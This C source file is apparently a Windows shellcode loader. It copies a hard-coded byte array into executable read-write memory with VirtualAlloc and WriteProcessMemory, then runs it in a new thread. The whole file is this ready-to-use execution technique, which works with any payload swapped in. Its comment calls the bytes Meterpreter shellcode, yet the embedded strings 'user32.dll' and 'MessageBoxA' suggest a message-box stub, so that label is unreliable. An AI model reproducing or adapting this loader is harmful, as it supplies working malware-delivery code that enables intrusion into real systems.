#include <stdio.h>
#include <windows.h>

// Define the thread function for executing shellcode
// This function will be executed in a separate thread created later in the main function
DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
    // Create a function pointer called 'shellcode' and initialize it with the address of the shellcode
    void (*shellcode)() = (void (*)())lpParam;

    // Call the shellcode function using the function pointer
    shellcode();

    return 0;
}

int main() {
    // Insert the Meterpreter shellcode 
    unsigned char code[] = {
        0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x28, 0xb9, 0x8e, 0xfe, 0x1f, 
        0x4b, 0xe8, 0x1a, 0x01, 0x00, 0x00, 0x48, 0x89, 0x45, 0xf8, 0x48, 0x8b, 
        0x4d, 0xf8, 0xba, 0x06, 0x80, 0xe8, 0xc8, 0xe8, 0x97, 0x00, 0x00, 0x00, 
        0x48, 0x89, 0x45, 0xf0, 0x48, 0x8b, 0x4d, 0xf8, 0xba, 0xef, 0x62, 0xc0, 
        0x1f, 0xe8, 0x85, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0xe8, 0x48, 0x8d, 
        0x0d, 0x7f, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x7d, 0xf0, 0x48, 0x83, 0xec, 
        0x28, 0xff, 0xd7, 0x48, 0x83, 0xc4, 0x28, 0x48, 0x89, 0x45, 0xe0, 0x48, 
        0x8b, 0x4d, 0xe0, 0x48, 0x8d, 0x15, 0x6d, 0x01, 0x00, 0x00, 0x48, 0x8b, 
        0x7d, 0xe8, 0x48, 0x83, 0xec, 0x28, 0xff, 0xd7, 0x48, 0x83, 0xc4, 0x28, 
        0x48, 0x89, 0x45, 0xd8, 0x48, 0x31, 0xc9, 0x48, 0x8d, 0x15, 0x46, 0x01, 
        0x00, 0x00, 0x4c, 0x8d, 0x05, 0x4a, 0x01, 0x00, 0x00, 0x45, 0x31, 0xc9, 
        0x48, 0x83, 0xec, 0x28, 0xff, 0xd0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 
        0x31, 0xc0, 0x44, 0x8a, 0x01, 0x41, 0x80, 0xf8, 0x00, 0x74, 0x1f, 0x41, 
        0x80, 0xf8, 0x41, 0x72, 0x0a, 0x41, 0x80, 0xf8, 0x5a, 0x77, 0x04, 0x41, 
        0x80, 0xc8, 0x20, 0xc1, 0xc0, 0x07, 0x4d, 0x0f, 0xb6, 0xc0, 0x4c, 0x31, 
        0xc0, 0x48, 0x01, 0xd1, 0xeb, 0xd8, 0xc3, 0x8b, 0x71, 0x3c, 0x48, 0x8d, 
        0x34, 0x31, 0x8b, 0xb6, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x34, 0x31, 
        0x8b, 0x7e, 0x20, 0x8d, 0x3c, 0x39, 0x44, 0x8b, 0x4e, 0x24, 0x46, 0x8d, 
        0x0c, 0x09, 0x44, 0x8b, 0x07, 0x4e, 0x8d, 0x04, 0x01, 0x57, 0x51, 0x52, 
        0x56, 0x4c, 0x89, 0xc1, 0xba, 0x01, 0x00, 0x00, 0x00, 0xe8, 0x9d, 0xff, 
        0xff, 0xff, 0x5e, 0x5a, 0x59, 0x5f, 0x48, 0x39, 0xd0, 0x74, 0x0a, 0x48, 
        0x83, 0xc7, 0x04, 0x49, 0x83, 0xc1, 0x02, 0x75, 0xd5, 0x66, 0x45, 0x8b, 
        0x49, 0x02, 0x49, 0x81, 0xe1, 0xff, 0x0f, 0x00, 0x00, 0x4d, 0x6b, 0xc9, 
        0x04, 0x49, 0x83, 0xe9, 0x04, 0x44, 0x8b, 0x56, 0x1c, 0x4d, 0x01, 0xca, 
        0x4e, 0x8d, 0x14, 0x11, 0x45, 0x8b, 0x12, 0x4a, 0x8d, 0x04, 0x11, 0xc3, 
        0x65, 0x48, 0x8b, 0x3c, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x7f, 
        0x18, 0x48, 0x8b, 0x7f, 0x10, 0x48, 0x89, 0xfe, 0x4c, 0x8b, 0x46, 0x60, 
        0x41, 0x50, 0x57, 0x56, 0x51, 0x4c, 0x89, 0xc1, 0xba, 0x02, 0x00, 0x00, 
        0x00, 0xe8, 0x39, 0xff, 0xff, 0xff, 0x59, 0x5e, 0x5f, 0x41, 0x58, 0x48, 
        0x39, 0xc8, 0x74, 0x08, 0x48, 0x8b, 0x36, 0x48, 0x39, 0xfe, 0x75, 0xd8, 
        0x48, 0x8b, 0x46, 0x30, 0xc3, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 
        0x18, 0x48, 0x89, 0x4d, 0xf8, 0x48, 0x89, 0x55, 0xf0, 0x4c, 0x89, 0x45, 
        0xe8, 0x4d, 0x31, 0xff, 0x48, 0x8b, 0x55, 0xf0, 0x4a, 0x8d, 0x14, 0xba, 
        0x8b, 0x02, 0x83, 0xf8, 0xff, 0x74, 0x19, 0x48, 0x8b, 0x4d, 0xf8, 0x89, 
        0xc2, 0xe8, 0x1d, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x55, 0xe8, 0x4a, 0x89, 
        0x04, 0xfa, 0x49, 0x83, 0xc7, 0x01, 0xeb, 0xd8, 0x4c, 0x89, 0xf8, 0x48, 
        0x89, 0xec, 0x5d, 0xc3, 0x06, 0x80, 0xe8, 0xc8, 0xef, 0x62, 0xc0, 0x1f, 
        0xff, 0xff, 0xff, 0xff, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 
        0x6c, 0x6c, 0x00, 0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6f, 
        0x78, 0x41, 0x00
    };
    
    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region using WriteProcessMemory
    SIZE_T bytesWritten;
    WriteProcessMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Create a new thread to execute the shellcode
    // Pass the address of the ExecuteShellcode function as the thread function, and 'exec' as its parameter
    // The returned handle of the created thread is stored in hThread
    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, exec, 0, NULL); 

    // Wait for the shellcode execution thread to finish executing
    // This ensures the main thread doesn't exit before the shellcode has finished running
    WaitForSingleObject(hThread, INFINITE);    

    // Return 0 as the main function exit code
    return 0;
}